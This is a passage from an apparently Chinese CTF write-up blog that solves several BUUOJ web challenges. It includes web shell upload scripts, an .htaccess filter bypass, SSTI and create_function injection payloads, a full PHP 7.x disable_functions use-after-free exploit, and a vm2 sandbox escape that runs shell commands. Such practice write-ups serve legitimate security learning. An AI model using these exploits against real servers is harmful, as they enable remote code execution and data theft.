flag=tmp\n            print(j,end=\"\")\n#you_will_never_know7788990\n```\n\n脚本拿到password，再随便写一个除admin之外的user就行\n\n## [SUCTF 2019]EasyWeb\n\n```php\n<?php\nfunction get_the_flag(){\n    // webadmin will remove your upload file every 20 min!!!! \n    $userdir = \"upload/tmp_\".md5($_SERVER['REMOTE_ADDR']);\n    if(!file_exists($userdir)){\n    mkdir($userdir);\n    }\n    if(!empty($_FILES[\"file\"])){\n        $tmp_name = $_FILES[\"file\"][\"tmp_name\"];\n        $name = $_FILES[\"file\"][\"name\"];\n        $extension = substr($name, strrpos($name,\".\")+1);\n    if(preg_match(\"/ph/i\",$extension)) die(\"^_^\"); \n        if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) die(\"^_^\");\n    if(!exif_imagetype($tmp_name)) die(\"^_^\"); \n        $path= $userdir.\"/\".$name;\n        @move_uploaded_file($tmp_name, $path);\n        print_r($path);\n    }\n}\n\n$hhh = @$_GET['_'];\n\nif (!$hhh){\n    highlight_file(__FILE__);\n}\n\nif(strlen($hhh)>18){\n    die('One inch long, one inch strong!');\n}\n\nif ( preg_match('/[\\x00- 0-9A-Za-z\\'\"\\`~_&.,|=[\\x7F]+/i', $hhh) )\n    die('Try something else!');\n\n$character_type = count_chars($hhh, 3);\nif(strlen($character_type)>12) die(\"Almost there!\");\n\neval($hhh);\n?>\n```\n\n看代码，应该是让我们执行`get_the_flag`函数再上传文件getshell\n\n首先是[正则绕过](https://blog.csdn.net/mochu7777777/article/details/104631142)，使用异或绕过\n\n```\n?_=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=get_the_flag\n```\n\n下一步就是走文件内容过滤绕过了\n\n首先过了文件带ph后缀，然后检查文件中有没有<?，最后通过`exif_imagetype`看看是不是图片\n\n所有php类型文件想都不要想了，用.htaccess，但是如果直接添加幻数头会导致整个文件不被解析，所以新知识来辣\n\n> exif_imagetype()函数是PHP中的内置函数，用于确定图像的类型。\n>\n> **用法:**\n>\n> ```\n> int exif_imagetype( string $filename )\n> ```\n>\n> **参数：**该函数接受单个参数$filename，该参数保存图像的名称或URL。\n>\n> **返回值：**此函数返回与IMAGETYPE常量之一相对应的整数，如下所示：\n>\n> - IMAGETYPE_GIF(1)\n> - IMAGETYPE_JPEG(2)\n> - IMAGETYPE_PNG(3)\n> - IMAGETYPE_SWF(4)\n> - IMAGETYPE_PSD(5)\n> - IMAGETYPE_BMP(6)\n> - IMAGETYPE_TIFF_II(7)\n> - IMAGETYPE_TIFF_MM(8)\n> - IMAGETYPE_JPC(9)\n> - IMAGETYPE_JP2(10)\n> - IMAGETYPE_JPX(11)\n> - IMAGETYPE_JB2(12)\n> - IMAGETYPE_SWC(13)\n> - IMAGETYPE_IFF(14)\n> - IMAGETYPE_WBMP(15)\n> - IMAGETYPE_XBM(16)\n> - IMAGETYPE_ICO(17)\n> - IMAGETYPE_WEBP(18)\n\n只有当文件内容不属于以上任何一种图片类型的时候才会返回FALSE\n\n而在.htaccess中有两个注释符号\n\n```\n\\x00\n#\n```\n\n恰巧在图片中就有两种类型的图片是有这样开头的内容的\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-09 23.51.41.png)\n\n> \\x00\\x00\\x85\\x85 只能放在文件开头位置\n\n> \\#define width 1337\n> \\#define height 1337\n> 可以放在文件任意位置\n\n注意好这个就可以上传成功.htaccess文件啦\n\n下面想想木马如何构造，由于对内容中的标签<?进行了过滤，所以是不能使用任何已知的短标签绕过方法进行绕过的，并且在这个版本的PHP中，类似于`<script language=\"php\">`这样的标签也是不生效的，骚操作来了，使用php伪协议用base64绕过，构造内容时在.htaccess中添加伪协议，最终构造出的shell和.htaccess文件如下\n\n```\n.htaccess\n#define width 1000\n#define height 1000\nAddType application/x-httpd-php .kkk\nphp_value auto_append_file \"php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_cc551ab005b2e60fbdc88de809b2c4b1/kk.kkk\"\n```\n\n```python\nimport requests\nimport base64\nhta=b'''\n#define width 1000\n#define height 1000\nAddType application/x-httpd-php .kkk\nphp_value auto_append_file \"php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_cc551ab005b2e60fbdc88de809b2c4b1/kk.kkk\"\n'''\nhta={'file':('.htaccess',hta,\"image/png\")}\nurl=\"http://42c1f3d3-4023-4a55-822e-532aa2640e28.node4.buuoj.cn:81/?_=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=get_the_flag\"\nres=requests.post(url=url,files=hta).text\nprint(res)\nshell = b\"GIF89aaa\" + base64.b64encode(b\"<?php eval($_REQUEST['kkk']);?>\")\nshe={'file':('kk.kkk',shell,\"image/png\")}\nres=requests.post(url=url,files=she).text\nprint(res)\n```\n\n上传并访问，成功\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-10 00.09.32.png)\n\n可以看到禁用了巨多的函数，~~其实这里搜索flag就能直接拿到flag了~~，不能执行系统命令，open_basedir又被限制了，尝试[绕过](https://xz.aliyun.com/t/4720)\n\n```\npayload:\nkkk=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir('/'));\n```\n\n然后拿flag\n\n```\npayload:\nkkk=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo file_get_contents('/THis_Is_tHe_F14g');\n```\n\n## [NPUCTF2020]ezinclude\n\n首先看源码提示，提示了pass内容，再看响应头中的Hash，直接传入，跳转flflflflag.php看内容中有个include，读取一把源码\n\n```php\n<?php\n$file=$_GET['file'];\nif(preg_match('/data|input|zip/is',$file)){\n\tdie('nonono');\n}\n@include($file);\necho 'include($_GET[\"file\"])';\n?>\n```\n\n过滤了data，input，zip\n\n新知识\n\n> 可以利用\n>\n> php://filter/string.strip_tags\n>\n> 导致php崩溃，同时可上传文件保存在/tmp目录来上传木马。\n>\n> 利用条件：\n>\n> - php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复\n> - php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复\n> - php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复\n> - 可以获取文件名\n> - 源代码将GET参数进行文件包含\n\n构造python脚本\n\n```python\nimport requests\nurl = \"http://eecf8a4a-cb71-40a6-9ff8-6e21849084dd.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd\"\nphpfile = \"<?php phpinfo(); ?>\"\nfiledata = {\n    \"file\":phpfile\n}\nbak = requests.post(url=url, files=filedata)\nprint(bak.text)\n```\n\n此时实例崩溃重启，但是/tmp中的内容依然保存，访问dir.php（目录扫描扫出来的）查看tmp中的内容，发现刚上传的文件，使用include包含后搜索flag拿到flag\n\n## [CISCN2019 华东南赛区]Double Secret\n\n进去访问/secret\n\n```\nTell me your secret.I will encrypt it so others can't see\n```\n\n传参数secret，输点乱七八糟的让它报错，看源码\n\n```python\n    if(secret==None):\n        return 'Tell me your secret.I will encrypt it so others can\\'t see'\n    rc=rc4_Modified.RC4(\"HereIsTreasure\")   #解密\n    deS=rc.do_crypt(secret)\n    a=render_template_string(safe(deS))\n    if 'ciscn' in a.lower():\n        return 'flag detected!'\n    return a\n```\n\n就是对传入的secret进行RC4编码后再模版渲染\n\n偷一个师傅的脚本\n\n```python\nimport base64\nfrom urllib.parse import quote\ndef rc4_main(key = \"init_key\", message = \"init_message\"):\n    # print(\"RC4加密主函数\")\n    s_box = rc4_init_sbox(key)\n    crypt = str(rc4_excrypt(message, s_box))\n    return  crypt\ndef rc4_init_sbox(key):\n    s_box = list(range(256))\n    # print(\"原来的 s 盒：%s\" % s_box)\n    j = 0\n    for i in range(256):\n        j = (j + s_box[i] + ord(key[i % len(key)])) % 256\n        s_box[i], s_box[j] = s_box[j], s_box[i]\n    # print(\"混乱后的 s 盒：%s\"% s_box)\n    return s_box\ndef rc4_excrypt(plain, box):\n    # print(\"调用加密程序成功。\")\n    res = []\n    i = j = 0\n    for s in plain:\n        i = (i + 1) % 256\n        j = (j + box[i]) % 256\n        box[i], box[j] = box[j], box[i]\n        t = (box[i] + box[j]) % 256\n        k = box[t]\n        res.append(chr(ord(s) ^ k))\n    cipher = \"\".join(res)\n    print(\"%s\" %quote(cipher))\n    return (str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))\nrc4_main(\"HereIsTreasure\",\"{{lipsum.__globals__.__builtins__.eval(\\\"__import__('os').popen('cat /flag.txt').read()\\\")}}\")\n```\n\n传入喵喵喵\n\n## [GYCTF2020]EasyThinking\n\n看这个题目怕不是ThinkPHP，随便搞一个不存在的目录，发现确实是ThinkPHP V6.0的一个session处任意文件写入漏洞\n\n> 大概就是在./runtime/session/目录下写入一个名为sess_SESSIONID的文件，内容是传入的参数内容\n\n那么在搜索处构造木马`<?php eval($_POST[a]);?>`\n\n然后访问`/runtime/session/sess_d62297dbd2f3523b5b66a5036c3f.php`\n\nban了一堆函数，找`disable_functions`绕过poc\n\n```php\n<?php\n\n# PHP 7.0-7.4 disable_functions bypass PoC (*nix only)\n#\n# Bug: https://bugs.php.net/bug.php?id=76047\n# debug_backtrace() returns a reference to a variable \n# that has been destroyed, causing a UAF vulnerability.\n#\n# This exploit should work on all PHP 7.0-7.4 versions\n# released as of 30/01/2020.\n#\n# Author: https://github.com/mm0r1\n\npwn(\"ls /\");\n\nfunction pwn($cmd) {\n    global $abc, $helper, $backtrace;\n\n    class Vuln {\n        public $a;\n        public function __destruct() { \n            global $backtrace; \n            unset($this->a);\n            $backtrace = (new Exception)->getTrace(); # ;)\n            if(!isset($backtrace[1]['args'])) { # PHP >= 7.4\n                $backtrace = debug_backtrace();\n            }\n        }\n    }\n\n    class Helper {\n        public $a, $b, $c, $d;\n    }\n\n    function str2ptr(&$str, $p = 0, $s = 8) {\n        $address = 0;\n        for($j = $s-1; $j >= 0; $j--) {\n            $address <<= 8;\n            $address |= ord($str[$p+$j]);\n        }\n        return $address;\n    }\n\n    function ptr2str($ptr, $m = 8) {\n        $out = \"\";\n        for ($i=0; $i < $m; $i++) {\n            $out .= chr($ptr & 0xff);\n            $ptr >>= 8;\n        }\n        return $out;\n    }\n\n    function write(&$str, $p, $v, $n = 8) {\n        $i = 0;\n        for($i = 0; $i < $n; $i++) {\n            $str[$p + $i] = chr($v & 0xff);\n            $v >>= 8;\n        }\n    }\n\n    function leak($addr, $p = 0, $s = 8) {\n        global $abc, $helper;\n        write($abc, 0x68, $addr + $p - 0x10);\n        $leak = strlen($helper->a);\n        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }\n        return $leak;\n    }\n\n    function parse_elf($base) {\n        $e_type = leak($base, 0x10, 2);\n\n        $e_phoff = leak($base, 0x20);\n        $e_phentsize = leak($base, 0x36, 2);\n        $e_phnum = leak($base, 0x38, 2);\n\n        for($i = 0; $i < $e_phnum; $i++) {\n            $header = $base + $e_phoff + $i * $e_phentsize;\n            $p_type  = leak($header, 0, 4);\n            $p_flags = leak($header, 4, 4);\n            $p_vaddr = leak($header, 0x10);\n            $p_memsz = leak($header, 0x28);\n\n            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write\n                # handle pie\n                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;\n                $data_size = $p_memsz;\n            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec\n                $text_size = $p_memsz;\n            }\n        }\n\n        if(!$data_addr || !$text_size || !$data_size)\n            return false;\n\n        return [$data_addr, $text_size, $data_size];\n    }\n\n    function get_basic_funcs($base, $elf) {\n        list($data_addr, $text_size, $data_size) = $elf;\n        for($i = 0; $i < $data_size / 8; $i++) {\n            $leak = leak($data_addr, $i * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                # 'constant' constant check\n                if($deref != 0x746e6174736e6f63)\n                    continue;\n            } else continue;\n\n            $leak = leak($data_addr, ($i + 4) * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                # 'bin2hex' constant check\n                if($deref != 0x786568326e6962)\n                    continue;\n            } else continue;\n\n            return $data_addr + $i * 8;\n        }\n    }\n\n    function get_binary_base($binary_leak) {\n        $base = 0;\n        $start = $binary_leak & 0xfffffffffffff000;\n        for($i = 0; $i < 0x1000; $i++) {\n            $addr = $start - 0x1000 * $i;\n            $leak = leak($addr, 0, 7);\n            if($leak == 0x10102464c457f) { # ELF header\n                return $addr;\n            }\n        }\n    }\n\n    function get_system($basic_funcs) {\n        $addr = $basic_funcs;\n        do {\n            $f_entry = leak($addr);\n            $f_name = leak($f_entry, 0, 6);\n\n            if($f_name == 0x6d6574737973) { # system\n                return leak($addr + 8);\n            }\n            $addr += 0x20;\n        } while($f_entry != 0);\n        return false;\n    }\n\n    function trigger_uaf($arg) {\n        # str_shuffle prevents opcache string interning\n        $arg = str_shuffle(str_repeat('A', 79));\n        $vuln = new Vuln();\n        $vuln->a = $arg;\n    }\n\n    if(stristr(PHP_OS, 'WIN')) {\n        die('This PoC is for *nix systems only.');\n    }\n\n    $n_alloc = 10; # increase this value if UAF fails\n    $contiguous = [];\n    for($i = 0; $i < $n_alloc; $i++)\n        $contiguous[] = str_shuffle(str_repeat('A', 79));\n\n    trigger_uaf('x');\n    $abc = $backtrace[1]['args'][0];\n\n    $helper = new Helper;\n    $helper->b = function ($x) { };\n\n    if(strlen($abc) == 79 || strlen($abc) == 0) {\n        die(\"UAF failed\");\n    }\n\n    # leaks\n    $closure_handlers = str2ptr($abc, 0);\n    $php_heap = str2ptr($abc, 0x58);\n    $abc_addr = $php_heap - 0xc8;\n\n    # fake value\n    write($abc, 0x60, 2);\n    write($abc, 0x70, 6);\n\n    # fake reference\n    write($abc, 0x10, $abc_addr + 0x60);\n    write($abc, 0x18, 0xa);\n\n    $closure_obj = str2ptr($abc, 0x20);\n\n    $binary_leak = leak($closure_handlers, 8);\n    if(!($base = get_binary_base($binary_leak))) {\n        die(\"Couldn't determine binary base address\");\n    }\n\n    if(!($elf = parse_elf($base))) {\n        die(\"Couldn't parse ELF header\");\n    }\n\n    if(!($basic_funcs = get_basic_funcs($base, $elf))) {\n        die(\"Couldn't get basic_functions address\");\n    }\n\n    if(!($zif_system = get_system($basic_funcs))) {\n        die(\"Couldn't get zif_system address\");\n    }\n\n    # fake closure object\n    $fake_obj_offset = 0xd0;\n    for($i = 0; $i < 0x110; $i += 8) {\n        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));\n    }\n\n    # pwn\n    write($abc, 0x20, $abc_addr + $fake_obj_offset);\n    write($abc, 0xd0 + 0x38, 1, 4); # internal func type\n    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler\n\n    ($helper->b)($cmd);\n    exit();\n}\n?>\n```\n\n把命令改为/readflag并且使用蚁剑把poc上传并访问，成功拿到flag\n\n## [HFCTF2020]JustEscape\n\n首页提示了可能不是php哦\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-10 01.09.27.png)\n\n看wp说是node.js~~本人完全没有接触过~~\n\n测试使用Error().stack函数，发现确实是node.js，是VM2沙箱逃逸，[现成poc](https://github.com/patriksimek/vm2/issues/225)直接使用\n\n```js\n\"use strict\";\nconst {VM} = require('vm2');\nconst untrusted = '(' + function(){\n    TypeError[`${`${`prototyp`}e`}`].get_process = f=>f.constructor(\"return process\")();\n    try{\n        Object.preventExtensions(Buffer.from(\"\")).a = 1;\n    }catch(e){\n        return e.get_process(()=>{}).mainModule.require(\"child_process\").execSync(\"whoami\").toString();\n    }\n}+')()';\ntry{\n    console.log(new VM().run(untrusted));\n}catch(x){\n    console.log(x);\n}\n```\n\n但是这题有关键字过滤，在这使用javascript的模版文字绕过，如\n\n```\nprototype变成`${`${`prototyp`}e`}`\n```\n\n最终payload\n\n```js\n(function (){\n    TypeError[`${`${`prototyp`}e`}`][`${`${`get_proces`}s`}`] = f=>f[`${`${`constructo`}r`}`](`${`${`return this.proces`}s`}`)();\n    try{\n        Object.preventExtensions(Buffer.from(``)).a = 1;\n    }catch(e){\n        return e[`${`${`get_proces`}s`}`](()=>{}).mainModule[`${`${`requir`}e`}`](`${`${`child_proces`}s`}`)[`${`${`exe`}cSync`}`](`cat /flag`).toString();\n    }\n})()\n```\n\n## [BJDCTF2020]EzPHP\n\n看源码，base32解码后访问\n\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0); \n\n$file = \"1nD3x.php\";\n$shana = $_GET['shana'];\n$passwd = $_GET['passwd'];\n$arg = '';\n$code = '';\n\necho \"<br /><font color=red><B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!</B><br></font>\";\n\nif($_SERVER) { \n    if (\n        preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\\"|\\'|log/i', $_SERVER['QUERY_STRING'])\n        )  \n        die('You seem to want to do something bad?'); \n}\n\nif (!preg_match('/http|https/i', $_GET['file'])) {\n    if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { \n        $file = $_GET[\"file\"]; \n        echo \"Neeeeee! Good Job!<br>\";\n    } \n} else die('fxck you! What do you want to do ?!');\n\nif($_REQUEST) { \n    foreach($_REQUEST as $value) { \n        if(preg_match('/[a-zA-Z]/i', $value))  \n            die('fxck you! I hate English!'); \n    } \n} \n\nif (file_get_contents($file) !== 'debu_debu_aqua')\n    die(\"Aqua is the cutest five-year-old child in the world! Isn't it ?<br>\");\n\n\nif ( sha1($shana) === sha1($passwd) && $shana != $passwd ){\n    extract($_GET[\"flag\"]);\n    echo \"Very good! you know my password. But what is flag?<br>\";\n} else{\n    die(\"fxck you! you don't know my password! And you don't know sha1! why you come here!\");\n}\n\nif(preg_match('/^[a-z0-9]*$/isD', $code) || \npreg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\{|\\%|x|\\&|\\$|\\*|\\||\\<|\\\"|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i', $arg) ) { \n    die(\"<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w=\"); \n} else { \n    include \"flag.php\";\n    $code('', $arg); \n} ?>\nThis is a very simple challenge and if you solve it I will give you a flag. Good Luck!\nAqua is the cutest five-year-old child in the world! Isn't it ?\n```\n\n就是绕呗\n\n**P1**\n\n`$_SERVER[\"QUERY_STRING\"] `中是?后的内容，在直接读取时并不会进行url解码，但是在使用$_GET访问某一参数的时候会进行URL解码，在这里我们只需要对内容进行URL编码即可\n\n**P2**\n\n换行绕过\n\n**P3**\n\n在`$_REQUEST`中，POST的优先级大于GET传入的参量，所以我们再在POST中重新传一次同名参量就行\n\n**P4**\n\n伪协议绕过，记得URL编码\n\n**P5**\n\nSHA1强比较绕过，类似md5，用数组即可\n\n**P6**\n\n新知识：create_function()\n\n> create_function()注入原理：\n>\n> create_function()函数有两个参数`$args`和`$code`，用于创建一个lambda样式的函数，首先可以用create_function()创建一个简单函数\n\n```php\n<?php\n$afunc = create_function('$a, $b','return ($a+$b);');\necho $afunc(1,2);\n//输出3\n?>\n```\n\n> 而本题的$code('', $arg); //此处存在create_function()注入中可以通过控制$arg来进行代码注入\n> 首先保证传入的$code为create_funtion，\n> 其次是$arg参数，本题中过滤了cat、flag、scan等关键字，无法直接命令执行得到flag的值，在网上查阅后找到了合适的函数get_defined_vars()直接输出所有变量，构造payload如下\n\n```\nfl%61g[c%6fde]=create_function&fl%61g[%61rg]=}var_dump(get_defined_vars());//\n```\n\n然鹅还是拿不到flag，提示flag在`rea1fl4g.php`中，访问发现拿不到，应该是以变量形式放进去了，那么尝试包含这个文件并将所有变量打印出来应该就行了，include函数被ban，尝试require加base64编码\n\n```\nfl%61g[%61rg]=}require(base64_dec%6fde(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());//\n```\n\n给了个假的flag😅，读源码\n\n```\nrequire(php://filter/read=convert.base64-encode/resource=rea1fl4g.php);\n滤的太多了走取反绕过吧\nfl%61g[%61rg]=}require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));//\n```\n\n```\n\t$f4ke_flag = \"BJD{1am_a_fake_f41111g23333}\";\n\t$rea1_f1114g = \"flag{4821ec92-8b00-4b72-b98c-4a7a296d9073}\";\n\tunset($rea1_f1114g);\nunset就离谱！！！！！！！！！！！！！！！！！！！！！！！！！！！\n```\n\n## [GXYCTF2019]StrongestMind\n\n```python\nimport requests\nimport re\nimport time\nurl=\"http://3dd7fedb-f52b-4054-a53e-07ea193a2b99.node4.buuoj.cn:81/index.php\"\ncookie={\"PHPSESSID\":\"f564584a331647033d332274c6bc3eb5\"}\ntes=requests.get(url=url,cookies=cookie).text\ni=re.findall(r\"\\d+\\s[\\/|\\+|\\*|-]\\s\\d+\",tes)\nprint(tes)\nfor j in range(1,2000):\n    data={'answer':f\"{eval(i[0])}\"}\n    tes=requests.post(url=url,cookies=cookie,data=data).text\n    i = re.findall(r\"\\d+\\s[\\/|\\+|\\*|-]\\s\\d+\", tes)\n    if \"flag{\" in tes:\n        print(tes)\n    else:\n        try:\n            print(re.findall(r'ç¬¬ \\d+ æ¬',tes)[0])\n        except:\n            print()\n    time.sleep(0.1)\n```\n\n没了\n\n## [MRCTF2020]Ezaudit\n\nwww.zip拿源码\n\n```php\n<?php \nheader('Content-type:text/html; charset=utf-8');\nerror_reporting(0);\nif(isset($_POST['login'])){\n    $username = $_POST['username'];\n    $password = $_POST['password'];\n    $Private_key = $_POST['Private_key'];\n    if (($username == '') || ($password == '') ||($Private_key == '')) {\n        // 若为空,视为未填写,提示错误,并3秒后返回登录界面\n        header('refresh:2; url=login.html');\n        echo \"用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!\";\n        exit;\n}\n    else if($Private_key != '*************' )\n    {\n        header('refresh:2; url=login.html');\n        echo \"假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!\";\n        exit;\n    }\n\n    else{\n        if($Private_key === '************'){\n        $getuser = \"SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'\".';'; \n        $link=mysql_connect(\"localhost\",\"root\",\"root\");\n        mysql_select_db(\"test\",$link);\n        $result = mysql_query($getuser);\n        while($row=mysql_fetch_assoc($result)){\n            echo \"<tr><td>\".$row[\"username\"].\"</td><td>\".$row[\"flag\"].\"</td><td>\";\n        }\n    }\n    }\n\n} \n// genarate public_key \nfunction public_key($length = 16) {\n    $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';\n    $public_key = '';\n    for ( $i = 0; $i < $length; $i++ )\n    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);\n    return $public_key;\n  }\n\n  //genarate private_key\n  function private_key($length = 12) {\n    $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';\n    $private_key = '';\n    for ( $i = 0; $i < $length; $i++ )\n    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);\n    return $private_key;\n  }\n  $Public_key = public_key();\n  //$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???\n\n```\n\n爆破种子\n\n```python\ns = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'\nkey = 'KVQP0LdJKRaV3n9D'\nm = ''\nfor i in key:\n    for j in range(len(s)):\n        if i == s[j]:\n            m += \"{} {} 0 {} \".format(j,j,len(s)-1)\nprint(m)\n```\n\n爆破出种子为1775196155，服务器PHP版本为5.6.40，爆出private_key，admin加万能密码即可\n\n## [SUCTF 2018]GetShell\n\n```php\nif($contents=file_get_contents($_FILES[\"file\"][\"tmp_name\"])){\n    $data=substr($contents,5);\n    foreach ($black_char as $b) {\n        if (stripos($data, $b) !== false){\n            die(\"illegal char\");\n        }\n    }     \n} \n```\n\n黑名单过滤测试后发现滤掉了所有数字和字母，用取反或异或绕过\n\n```php\n$_=[];             //array\n$__=$_.$_;         //arrayarray \n$__=($_==$_); \t\t //true，结果为1\necho ~'茉'[$__];\t//s\necho ~'内'[$__];\t//y\necho ~'茉'[$__];\t//s\necho ~'苏'[$__];\t//t\necho ~'的'[$__];\t//e\necho ~'咩'[$__];\t//m\necho ~'课'[$__];\t//P\necho ~'尬'[$__];\t//O\necho ~'笔'[$__];\t//S\necho ~'端'[$__];\t//T\necho ~'瞎'[$__];\t//a\n```\n\n在这里可以这么使用是因为UTF-8编码在编码汉字时实际上是使用了三个单字符拼接编码的，使用[]即可取出中间的一个字符，再对这个字符进行取反操作，就可能能打印出我们想要的字符\n\n最终payload：\n\n```php\n<?=$_=[];$__.=$_;$____=$_==$_;$___=~茉[$____];$___.=~内[$____];$___.=~茉[$____];$___.=~苏[$____];$___.=~的[$____];$___.=~咩[$____];$_____=_;$_____.=~课[$____];$_____.=~尬[$____];$_____.=~笔[$____];$_____.=~端[$____];$__________=$$_____;$___($__________[~瞎[$____]]);\n```\n\n## [GYCTF2020]Easyphp\n\n反序列化，www.zip拿源码\n\n```php\n//lib.php\n<?php\nerror_reporting(0);\nsession_start();\nfunction safe($parm){\n    $array= array('union','regexp','load','into','flag','file','insert',\"'\",'\\\\',\"*\",\"alter\");\n    return str_replace($array,'hacker',$parm);\n}\nclass User\n{\n    public $id;\n    public $age=null;\n    public $nickname=null;\n    public function login() {\n        if(isset($_POST['username'])&&isset($_POST['password'])){\n        $mysqli=new dbCtrl();\n        $this->id=$mysqli->login('select id,password from user where username=?');\n        if($this->id){\n        $_SESSION['id']=$this->id;\n        $_SESSION['login']=1;\n        echo \"你的ID是\".$_SESSION['id'];\n        echo \"你好！\".$_SESSION['token'];\n        echo \"<script>window.location.href='./update.php'</script>\";\n        return $this->id;\n        }\n    }\n}\n    public function update(){\n        $Info=unserialize($this->getNewinfo());\n        $age=$Info->age;\n        $nickname=$Info->nickname;\n        $updateAction=new UpdateHelper($_SESSION['id'],$Info,\"update user SET age=$age,nickname=$nickname where id=\".$_SESSION['id']);\n        //这个功能还没有写完 先占坑\n    }\n    public function getNewInfo(){\n        $age=$_POST['age'];\n        $nickname=$_POST['nickname'];\n        return safe(serialize(new Info($age,$nickname)));\n    }\n    public function __destruct(){\n        return file_get_contents($this->nickname);//危\n    }\n    public function __toString()\n    {\n        $this->nickname->update($this->age);\n        return \"0-0\";\n    }\n}\nclass Info{\n    public $age;\n    public $nickname;\n    public $CtrlCase;\n    public function __construct($age,$nickname){\n        $this->age=$age;\n        $this->nickname=$nickname;\n    }\n    public function __call($name,$argument){\n        echo $this->CtrlCase->login($argument[0]);\n    }\n}\nClass UpdateHelper{\n    public $id;\n    public $newinfo;\n    public $sql;\n    public function __construct($newInfo,$sql){\n        $newInfo=unserialize($newInfo);\n        $upDate=new dbCtrl();\n    }\n    public function __destruct()\n    {\n        echo $this->sql;\n    }\n}\nclass dbCtrl\n{\n    public $hostname=\"127.0.0.1\";\n    public $dbuser=\"root\";\n    public $dbpass=\"root\";\n    public $database=\"test\";\n    public $name;\n    public $password;\n    public $mysqli;\n    public $token;\n    public function __construct()\n    {\n        $this->name=$_POST['username'];\n        $this->password=$_POST['password'];\n        $this->token=$_SESSION['token'];\n    }\n    public function login($sql)\n    {\n        $this->mysqli=new mysqli($this->hostname, $this->dbuser, $this->dbpass, $this->database);\n        if ($this->mysqli->connect_error) {\n            die(\"连接失败，错误:\" . $this->mysqli->connect_error);\n        }\n        $result=$this->mysqli->prepare($sql);\n        $result->bind_param('s', $this->name);\n        $result->execute();\n        $result->bind_result($idResult, $passwordResult);\n        $result->fetch();\n        $result->close();\n        if ($this->token=='admin') {\n            return $idResult;\n        }\n        if (!$idResult) {\n            echo('用户不存在!');\n            return false;\n        }\n        if (md5($this->password)!==$passwordResult) {\n            echo('密码错误！');\n            return false;\n        }\n        $_SESSION['token']=$this->name;\n        return $idResult;\n    }\n    public function update($sql)\n    {\n        //还没来得及写\n    }\n}\n\n```\n\n\n\n```php\n//update.php\n<?php\nrequire_once('lib.php');\necho '<html>\n<meta charset=\"utf-8\">\n<title>update</title>\n<h2>这是一个未完成的页面，上线时建议删除本页面</h2>\n</html>';\nif ($_SESSION['login']!=1){\n\techo \"你还没有登陆呢！\";\n}\n$users=new User();\n$users->update();\nif($_SESSION['login']===1){\n\trequire_once(\"flag.php\");\n\techo $flag;\n}\n?>\n```\n\n可以看到update.php中不论session的判断结果如何都会执行类中update方法，并且如果想获取flag就需要让`$_SESSION['login']===1`或者`$_SESSION['token']==='admin'`\n\n```PHP\nclass dbCtrl{    \n    public function login($sql)\n    {\n        $this->mysqli=new mysqli($this->hostname, $this->dbuser, $this->dbpass, $this->database);\n        if ($this->mysqli->connect_error) {\n            die(\"连接失败，错误:\" . $this->mysqli->connect_error);\n        }\n        $result=$this->mysqli->prepare($sql);\n        $result->bind_param('s', $this->name);\n        $result->execute();\n        $result->bind_result($idResult, $passwordResult);\n        $result->fetch();\n        $result->close();\n        if ($this->token=='admin') {\n            return $idResult;\n        }\n        if 